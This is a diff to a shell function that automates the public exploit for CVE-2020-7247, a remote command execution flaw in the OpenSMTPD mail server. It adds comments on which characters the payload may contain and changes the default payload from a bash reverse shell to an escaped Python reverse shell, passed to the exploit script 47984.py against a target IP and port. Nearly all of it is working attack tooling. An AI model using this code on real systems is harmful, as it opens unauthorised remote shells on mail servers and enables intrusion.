@@ -465,9 +465,20 @@ perform_cve_2020_7247_alt() {
         target_port=25
         echo "target_port is not set, using default: $target_port"
     fi
+    #original exploit writeup
+    #https://packetstorm.news/files/id/156137
+    #The 64 character limit might not be as restrictive on certain systems
+    #The following are characters ALLOWED. Make sure your payload
+    #Only has these special characters
+    #define MAILADDR_ALLOWED        "!#$%&'*/?^`{|}~+-=_"
+    #But it is important that the payload you write does not contain
+    #The following MAILADDR_ESCAPE characters, as they are transformed into :
+    #define MAILADDR_ESCAPE         "!#$%&'*?`{|}~"
+
     if [[ -z $cmd ]]; then
-        cmd=$(get_bash_reverse_shell)
-        cmd=$(encode_bash_payload "$cmd")
+        cmd=$(get_python_reverse_shell)
+        cmd=$(echo $cmd | sed -E "s/\"/\\\\\"/g")
+        cmd=$(echo $cmd | sed -E "s/'/\"/g")
         echo "cmd is not set, using default: $cmd"
     fi
     python 47984.py $target_ip $target_port "$cmd"
